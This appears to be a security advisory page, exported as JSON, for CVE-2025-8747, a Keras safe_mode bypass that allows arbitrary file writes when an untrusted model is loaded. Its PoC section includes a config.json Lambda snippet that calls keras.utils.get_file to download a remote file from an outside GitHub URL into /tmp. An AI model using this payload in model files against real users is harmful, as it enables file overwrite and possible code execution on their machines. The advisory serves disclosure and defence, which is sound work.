{"hash":"8457c889bd3a3e8812a3a34aa788efd831e3ff84","data":{"post":{"title":"Keras untrusted model arbitrary file write","path":"/vulnerabilities/keras-untrusted-model-arbitrary-file-write/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>This vulnerability allows attackers to perform an arbitrary file overwrite when an untrusted Keras v3 model is loaded, even when <code>safe_mode</code> is enabled. This can lead to arbitrary code execution in many cases.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/keras-team/keras/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">keras</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p> [3.0.0,3.11.0)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Keras’ <a href=\"https://www.tensorflow.org/api_docs/python/tf/keras/models/load_model\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">safe_mode</a> flag is designed to disallow unsafe lambda deserialization - specifically by rejecting any arbitrary embedded Python code, marked by the “<strong>lambda</strong>” class name.</p>\n<p>A fix to CVE-2025-1550, allowing deserialization of the object only from internal Keras modules, was introduced in the commit <a href=\"https://github.com/keras-team/keras/commit/bb340d6780fdd6e115f2f4f78d8dbe374971c930\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">bb340d6780fdd6e115f2f4f78d8dbe374971c930</a>.</p>\n<pre><code>package = module.split(\".\", maxsplit=1)[0]\nif package in {\"keras\", \"keras_hub\", \"keras_cv\", \"keras_nlp\"}:\n</code></pre>\n<p>However, it is still possible to exploit model loading, for example by reusing the internal Keras function <code>keras.utils.get_file</code>, and download remote files to an attacker-controlled location.</p>\n<p>This allows for arbitrary file overwrite which in many cases could also lead to remote code execution. For example, an attacker would be able to download a malicious <code>authorized_keys</code> file into the user’s SSH folder, giving the attacker full SSH access to the victim’s machine.\nSince the model does not contain arbitrary Python code, this scenario will not be blocked by “safe_mode”. It will bypass the latest fix since it uses a function from one of the approved modules (<code>keras</code>).</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>The following truncated <code>config.json</code> will cause a remote file download from <a href=\"https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js</a> to the local <code>/tmp</code> folder, by sending arbitrary arguments to Keras’ builtin function <code>keras.utils.get_file()</code> -</p>\n<pre><code class=\"language-json\">  {\n                \"class_name\": \"Lambda\",\n                \"config\": {\n                    \"arguments\": {\n                        \"origin\": \"https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js\",\n                        \"cache_dir\":\"/tmp\",\n                        \"cache_subdir\":\"\",\n                        \"force_download\": true},\n                    \"function\": {\n                        \"class_name\": \"function\",\n                        \"config\": \"get_file\",\n                        \"module\": \"keras.utils\"\n                    }\n                },\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/keras-team/keras/security/advisories/GHSA-c9rc-mg46-23w3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Advisory</a></p>\n<p><a href=\"https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Technical blog</a></p>\n","description":"CVE-2025-8747 High severity. Keras untrusted model arbitrary file write","date_published":"2025-08-12","xray_id":"","vul_id":"CVE-2025-8747","severity":"high","discovered_by":"Andrey Polkovnichenko","last_updated":"2025-08-12","cvss":8.8}},"context":{}}